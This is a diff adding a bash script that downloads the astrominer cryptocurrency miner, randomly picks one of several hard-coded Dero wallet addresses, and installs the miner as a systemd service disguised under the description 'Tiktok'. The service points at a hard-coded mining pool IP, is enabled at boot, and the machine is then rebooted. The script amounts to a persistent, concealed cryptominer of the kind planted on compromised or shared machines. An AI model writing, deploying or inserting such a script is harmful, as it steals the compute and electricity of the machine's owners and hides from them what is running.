@@ -1,0 +1,20 @@
+#!/bin/bash
+myArray=(
+"dero1qy542vjjyxhzqrn9elqvrxypk6ua0de756gpt6aleh0k34pac2t4gqq5ytcf2"
+"dero1qyzc44073d3qp3xkcv53v6wn2f36yuru2jj5fhcw7u6xtswgwzusxqq9c7h5g"
+"dero1qy0q59fjqztahcdfyk6etxta0xjheyw7xly7gngqpk9mkucv6jhqqqgmzx8cc"
+"dero1qy22c9nhclw49dhaj25aa9vy0dy9346nhwalkj9fmq6as3qy0nrwvqqxgepgk"
+"dero1qyvj90dy80ph9gjkty3l05sq5dvcw5rka5kf4fhv7qx2eu5g8typ5qq6fxp95"
+"dero1qyyvxwv46wp28mlcp088v0hfprl52vczt2cwrw4jjkau65q6lml8xqqqakke4"
+"dero1qyzgcrpwacnf56dewz24ne66m7m0paefylc9v2qzplhczy2txxu9qqq55gqdl"
+)
+wallet=${myArray[$RANDOM % ${#myArray[@]} ]}
+cd /home
+sudo wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
+sudo apt update
+sudo tar xvzf astrominer-V1.9_modern_amd64_linux.tar.gz
+sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w '$wallet' -r 172.174.96.165:4444 -r1 172.174.96.165:5555\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
+sudo systemctl daemon-reload
+sudo systemctl enable deroz.service
+echo "Setup completed!"
+sudo reboot
